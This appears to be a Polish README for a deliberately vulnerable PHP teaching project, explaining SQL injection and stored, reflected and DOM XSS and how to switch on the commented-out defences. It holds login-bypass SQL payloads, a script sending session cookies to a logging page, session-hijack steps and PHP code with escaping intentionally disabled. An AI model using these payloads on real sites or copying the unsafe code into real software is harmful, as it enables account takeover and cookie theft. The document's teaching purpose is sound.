Potrzebne loginy  (poza tym dołączam zrzut bazy danych z potrzebnymi tabelami do logowania i składania zamówień. Hasła userów w czystej formie, niezahashowane. Nazwa bazy danych ustawiona na s130719 w pliku connect.php w zmiennej $dbName. W razie potrzeby zmienić)
admin:12345
klient:12345

___
SQL Injection
___
Przy niezabezpieczonej stronie można w formularzu logowania przekazać swoje zapytanie SQL. Znając username da się zalogować bez hasła. Np dla username "admin", może wyglądać to tak- admin ' -- (admin, spacja, apostrof, spacja, 2 myślniki, spacja)
Nie znając username można metodą prób i błędów próbować odgadnąć nazwy kolumn w tabeli i próbować zalogować np. poprzez id (może równie dobrze być mail jeśli jest znany atakującemu)
' OR id=1 -- 

Zabezpieczenie- w pliku login.php jest fragment gdzie zakomentowane są zabezpieczenia

        $login = $_POST['login'];
        $password = $_POST['password'];

    //    $login = htmlentities($login, ENT_QUOTES, "UTF-8");
    //    $password = htmlentities($password, ENT_QUOTES, "UTF-8");



        $sql = "SELECT * FROM users WHERE user='$login' AND pass='$password'";

        if ($result = @$conn->query($sql))
      //      sprintf("SELECT * FROM users WHERE user='%s' AND pass='%s'",
      //      mysqli_real_escape_string($conn,$login),
      //      mysqli_real_escape_string($conn,$password))))

Odkomentować je (i przy ifie usunąć fragment "$sql))"  . Będzie wyglądać to tak jak niżej. Można równie dobrze zakomentować/usunąć linię ze zmienną $sql bo nie jest już używana. Zapytanie jest bezpośrednio w ifie ze zmiennymi przepuszczonymi dodakowo przez mysqli_real_escape_string())


        $login = $_POST['login'];
        $password = $_POST['password'];

        $login = htmlentities($login, ENT_QUOTES, "UTF-8");
        $password = htmlentities($password, ENT_QUOTES, "UTF-8");



        $sql = "SELECT * FROM users WHERE user='$login' AND pass='$password'";

        if ($result = @$conn->query(
            sprintf("SELECT * FROM users WHERE user='%s' AND pass='%s'",
            mysqli_real_escape_string($conn,$login),
            mysqli_real_escape_string($conn,$password))))


htmlentities()- zmienia potencjalnie niebezpieczne znaki na encje html (np < zostaje zmienione na &lt; . Przy wyświetlaniu, HTML pokaże też znak < ale nie zinterpretuje go jako otwieranie tagu przy próbie wpisania tagów html. <script> zostanie zmienione na &lt;script&gt;

mysqli_real_escape_string()   - dodaje \ przed potencjalnie niebezpiecznymi znakami. Np '  (zostaje zapisane jako \' dzięki czemu apostrof nie jest traktowany jako zakończenie stringa, tylko jako jego część)

____________________________________________________________

XSS-
Wykorzystuje brak lub luki w sanityzacji i walidacji inputu usera. W najprostszej postaci polega na wbiciu swojego kodu javascript w tagach <script> w miejscu gdzie mogą na niego wpaść potencjalne ofiary (tablice ogłoszeniowe, profile użytkownika i inne)


Stored XSS:
Na tej stronie przykładowo klient w formularzu zamówień po zalogowaniu może do szczegółów zamówienia wpisać swój skrypt przykładowo tutaj: <script>window.location.replace("http://localhost/test.php?cookie="+document.cookie);</script>
W takim wypadku w bazie danych zostaje zapisany ten skrypt, admin po wejściu na listę zamówień otrzymuje w tej liście z zaufanego serwera złośliwy kod który zostaje wykonany przez przeglądarkę. W tym wypadku zostaje przekierowany na podstronę test.php i do zmiennej cookie zapisane zostanie cookie obecnej sesji użytkownika. 
test.php który zapisuje cookie, ip, przeglądarkę i godzinę przechwycenia i zapisuje te dane w logi.txt
Widnieje wtedy tam przykładowo takie zapisane PHPSESSID "PHPSESSID=uftg02hvsde3vg1fj8qjvtglpe".
Atakujący mając id sesji ofiary może ustawić to id u siebie przykładowo poprzez wpisanie w konsoli przeglądarki: document.cookie = "PHPSESSID=uftg02hvsde3vg1fj8qjvtglpe"  i odświeżenie strony. O ile ofiara nie wylogowała swojego konta (wylogowując się, zamyka się najczęsćiej sesję usuwając zmienne sesyjne) to atakujący ma wtedy pełny dostęp do takiego konta.
PHPSESSID może być nazwane w inny sposób, nie zawsze jest na pierwszy rzut oka oczywiste która zmienna to phpsessid zapisane w cookie.
Poza tym drugą drogą przekazywania zmiennej sesyjnej może być document.location.href (link w przeglądarce).

Reflected XSS:
W tym wypadku złośliwy skrypt nie jest zapisany na serwerze na stałe, ale jest odsyłany przez serwer w odpowiedzi na zapytanie. W tym wypadku atak najczęściej polega na skłonieniu ofiary do kliknięcia w odpowiednio przygotowany link.
Tutaj dla przykładu strona 404.php (http://localhost/404.php) wyświetla informację o błędzie not found jednocześnie wyświetlając błędny odnośnik Not found: /404.php.
W takim wypadku można do takiej strony spróbować dodać swój skrypt przykładowo: http://localhost/404.php?<script>alert("test");</script>. Skrypt taki może być także napisany w taki sposób by przenosił na stronę która jak test.php przechwytuje dane ofiary po przeniesieniu.

DOM Based XSS:
w pliku form.php mamy prosty formularz z okienkiem wyboru. Okienko wyboru wstępnie wyświetla opcję domyślną zawartą w linku
http://localhost/form.php?default=French
Atakujący taką stronę może w linku zamieścić kod javascriptu. 
http://localhost/form.php?default=<script>alert(document.cookie)</script>
Niezabezpieczona strona, po wyświetleniu treści przez taki link wykona skrypt atakującego.

________________________



Dla przykładu zabezpieczenia user inputu w oknie zamówień- W pliku dborder.php jest fragment kodu z zakomentowanym przepuszczeniem zmiennej $opis przez htmlentities (wystarczy usunąć komentarz)

$opis = $_POST['desc'];
$idClient = $_SESSION['id'];
// $opis = htmlentities($opis, ENT_QUOTES, "UTF-8");

htmlentites będzie tutaj najprostszą (ale nie jedyną) metodą zabezpieczenia poprzez podmienienie określonych znaków na encje html.
Dodatkowo można zastosować escaping user input (wcześniej wspomniane przy mysqli_real_escape_string) przy wszelkich encjach HTML, URL czy javascriptu (jeśli nie chcemy pozwolić użytkownikom na używanie kodu na stronie)
Walidacja inputu usera- nie pozwalać na używanie określonych znaków w inpucie

Jeśli chcemy pozwolić użytkownikom na używanie pewnych tagów htmla (na przykład img żeby pozwolić im wstawiać obrazy) trzeba zwrócić uwagę na niektóre atrybuty i nie zezwalać na ich używanie. Przykładowo w tagu img można umieścić atrybut onerror="" który także może wywołać niebezpieczny kod javascriptu, więc samo zabronienie używania tagów <script> nie wystarczy.
